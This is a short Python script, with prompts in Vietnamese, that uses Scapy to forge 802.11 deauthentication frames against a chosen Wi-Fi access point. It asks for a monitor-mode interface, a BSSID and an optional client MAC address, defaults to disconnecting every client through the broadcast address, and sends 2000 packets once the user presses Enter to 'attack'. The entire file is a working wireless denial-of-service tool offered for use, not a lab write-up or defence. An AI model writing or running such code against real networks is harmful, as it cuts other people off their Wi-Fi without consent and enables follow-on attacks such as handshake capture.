from scapy.all import conf, sendp
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
import subprocess

MacClient="FF:FF:FF:FF:FF:FF"
conf.iface="wlp0s20f3mon"

interface=input(f"Nhập interface mạng được thiết lập monitor mode ({conf.iface}): ").strip()
if len(interface)>0:
    conf.iface=interface

interface_run=conf.iface.rstrip("mon")
# subprocess.call(["airmon-ng", "start", interface_run])

BSSID=input("Nhập BSSID của wifi:").strip()

mac_client= input("Mặc định deauthen toàn bộ, nhập MAC Client để tấn công Client chỉ định: ").strip()

if len(mac_client)==len(MacClient):
    MacClient=mac_client
    print("Tấn công Client chỉ định:",mac_client)
else:
    print("Tấn công toàn bộ")

conf.verb = 0
packet = RadioTap() / Dot11(type=0, subtype=12, addr1=MacClient, addr2=BSSID, addr3=BSSID) / Dot11Deauth(
    reason=7)
print("packet:", packet)
packet.show()

input("Ấn Enter để tấn công")

for n in range(2000):
    sendp(packet)
    print(f"Deauth sent via: {conf.iface} to BSSID: {BSSID} for Client: {MacClient}")
